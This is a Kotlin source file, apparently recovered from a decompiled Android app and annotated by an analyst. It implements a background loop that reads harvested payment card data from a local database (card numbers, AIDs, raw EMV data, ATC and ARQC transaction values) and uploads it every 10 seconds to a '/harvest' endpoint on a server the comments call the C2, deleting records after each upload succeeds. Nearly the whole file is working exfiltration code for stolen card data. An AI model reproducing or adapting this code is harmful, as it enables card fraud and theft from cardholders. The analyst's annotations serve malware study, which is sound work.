// orig: B2/s.java   (R8-renamed suspend lambda)
//
// Background coroutine launched once from MainActivity.onCreate on
// Dispatchers.IO. Every 10 seconds, sweeps the cards table, re-hydrates
// each row + its transactions, and posts to /harvest. Deletes on "Success".
//
// NO jitter, NO exponential backoff, NO retry counter, NO offline queue cap.
// On a flaky network the device hammers the C2 every 10 s with the same
// payload until it sticks.

package xyz.happify.ckemv.net

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import xyz.happify.ckemv.MainActivity
import xyz.happify.ckemv.jni.Reporter
import xyz.happify.ckemv.model.CardRecord
import xyz.happify.ckemv.model.HarvestedTx
import xyz.happify.ckemv.nfc.toUploadJson
import xyz.happify.ckemv.ui.UploadAckFlashLoop

class UploadLoop(private val activity: MainActivity) {

    suspend operator fun invoke() {
        while (true) {
            val db     = activity.dbHelper
            val apiKey = db.getApiKey() ?: "no-key"

            // Read all cached cards + their txs.
            val pending = mutableListOf<Pair<Long, CardRecord>>()
            val r = db.readableDatabase
            val cardCur = r.rawQuery("SELECT * FROM cards ORDER BY id ASC", null)
            if (cardCur.moveToFirst()) {
                do {
                    val id      = cardCur.getLong(cardCur.getColumnIndexOrThrow("id"))
                    val pan     = cardCur.getString(cardCur.getColumnIndexOrThrow("pan"))
                    val aid     = cardCur.getString(cardCur.getColumnIndexOrThrow("aid"))
                    val network = cardCur.getString(cardCur.getColumnIndexOrThrow("network"))
                    val rawData = cardCur.getString(cardCur.getColumnIndexOrThrow("raw_data"))

                    val txs = mutableListOf<HarvestedTx>()
                    val txCur = r.rawQuery(
                        "SELECT * FROM transactions WHERE card_id = ?",
                        arrayOf(id.toString())
                    )
                    if (txCur.moveToFirst()) {
                        do {
                            txs += HarvestedTx(
                                atc    = txCur.getString(txCur.getColumnIndexOrThrow("atc")),
                                arqc   = txCur.getString(txCur.getColumnIndexOrThrow("arqc")),
                                timeMs = txCur.getDouble(txCur.getColumnIndexOrThrow("time_ms")),
                                params = txCur.getString(txCur.getColumnIndexOrThrow("params")),
                                cve_id = txCur.getInt(txCur.getColumnIndexOrThrow("cve_id"))
                            )
                        } while (txCur.moveToNext())
                    }
                    txCur.close()

                    pending += id to CardRecord(pan, aid, network, rawData, txs)
                } while (cardCur.moveToNext())
            }
            cardCur.close()

            // POST each, delete on success.
            for ((cardId, card) in pending) {
                val body = card.toUploadJson().toString()
                val resp = Reporter.uploadHarvestData(body, apiKey, C2.BASE_URL)
                if ("Success" in resp) {
                    db.deleteCard(cardId)
                    db.writableDatabase.execSQL(
                        "UPDATE stats SET total_scans = total_scans + 1 WHERE id = 1"
                    )
                    withContext(Dispatchers.Main) { UploadAckFlashLoop(activity)() }
                }
            }

            delay(10_000)
        }
    }
}
